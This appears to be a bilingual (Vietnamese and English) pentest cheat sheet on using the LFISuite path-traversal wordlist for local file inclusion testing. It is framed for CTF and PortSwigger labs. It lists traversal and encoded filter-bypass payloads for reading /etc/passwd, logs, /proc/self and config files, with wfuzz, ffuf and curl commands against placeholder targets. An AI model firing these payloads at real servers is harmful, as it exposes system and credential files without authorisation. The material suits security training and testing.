# Wordlist Usage - LFI-LFISuite-pathtotest.txt

## 1. Wordlist profile (từ file hiện có)

- File: `reference/LFI-LFISuite-pathtotest.txt`
- Tổng payload: 569 dòng
- Relative-depth payloads (`../...`): 308
- Absolute paths: 258
- Payload có `%00`: 116
- Payload liên quan `/proc/self`: 115
- Payload liên quan logs: 227

## 2. Khi nào dùng payload nào

- Confirm nhanh vuln:
  - `../../../etc/passwd`
  - `/etc/passwd`
  - `..\..\..\windows\win.ini`
- Bypass filter:
  - `....//....//etc/passwd`
  - `%252e%252e%252fetc%252fpasswd`
- Loot sau khi confirm:
  - logs (`/var/log/...`)
  - proc (`/proc/self/...`)
  - config (`php.ini`, `httpd.conf`, `web.config`)

## 3. Fuzzing workflow (practical)

1. Baseline: gửi request hợp lệ, lưu status/length.
2. Quick shortlist: fuzz 10-20 payload high-value.
3. Full sweep: chạy toàn bộ wordlist.
4. Filter noise theo status/size/words.
5. Replay payload có kết quả tốt nhất để xác nhận thủ công.

## 4. Command examples

### wfuzz

```bash
wfuzz -c -w "_knowledge_base/Web/Path traversal/wordlist.txt" --hw 0 "http://TARGET/vuln.php?page=FUZZ"
```

### ffuf

```bash
ffuf -u "http://TARGET/loadImage?filename=FUZZ" -w "_knowledge_base/Web/Path traversal/reference/LFI-LFISuite-pathtotest.txt" -mc all -fs 0
```

### curl raw traversal (quan trọng)

```bash
curl --path-as-is "http://TARGET/download?file=../../../../etc/passwd"
```

## 5. Tối ưu wordlist theo mục tiêu

- Linux-only campaign: lọc dòng có `/etc/`, `/proc/`, `/var/log/`.
- Windows-only campaign: lọc dòng có `C:\`, `C:/`, `win.ini`, `web.config`.
- Log-only campaign: lọc dòng có `access.log`, `error.log`, `httpd`.

PowerShell examples:

```powershell
$src = "_knowledge_base/Web/Path traversal/reference/LFI-LFISuite-pathtotest.txt"
Get-Content $src | Select-String "/etc/|/proc/|/var/log/" | ForEach-Object { $_.Line } | Set-Content linux-subset.txt
Get-Content $src | Select-String "C:\\|C:/|win.ini|web.config" | ForEach-Object { $_.Line } | Set-Content windows-subset.txt
Get-Content $src | Select-String "access.log|error.log|httpd" | ForEach-Object { $_.Line } | Set-Content logs-subset.txt
```

## 6. Response triage rules

- Ứng viên tốt:
  - status 200/206/500 khác baseline
  - body length thay đổi rõ
  - body có marker (`root:x:`, `[extensions]`, `<?php`, `daemon:`)
- False positive hay gặp:
  - trang lỗi chung chung giống nhau cho mọi payload
  - redirect login/static response không đổi

## 7. CTF/PortSwigger mindset

- Không chạy full list ngay từ đầu.
- Confirm primitive bằng payload ngắn gọn trước.
- Có primitive rồi mới scale bằng wordlist.
- Mọi kết quả interesting đều replay thủ công để chốt bằng chứng.
